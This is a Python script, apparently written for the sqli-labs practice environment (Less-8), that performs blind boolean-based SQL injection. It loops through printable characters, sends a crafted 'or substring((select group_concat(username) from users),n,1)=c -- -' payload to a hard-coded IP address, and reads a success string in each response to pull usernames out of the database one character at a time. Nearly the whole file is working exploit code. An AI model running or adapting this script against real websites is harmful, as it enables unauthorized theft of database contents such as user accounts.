# coding=utf-8
import string

import requests

mystring = string.printable  # ??????
url = 'http://111.231.88.117/sqli_lab/sqli-labs-php7/Less-8/'
url += '?id=-1\' or (substring((select group_concat(username) from users),{0},1)=\'{1}\')-- -'
reply = 'You are in...........'
print(url)
count = 1
result = ''
while (True):
    temp_result = result
    for char in mystring:
        response=requests.get(url.format(count,char))
        #print(url.format(count,char))
        if reply in response.text:
            result+=char
            print(result+'......')
            break
    if result==temp_result:
        print('Complete!')
        break
    if '+++' in result:
        print('result: '+result[0:-3])
        break
    count+=1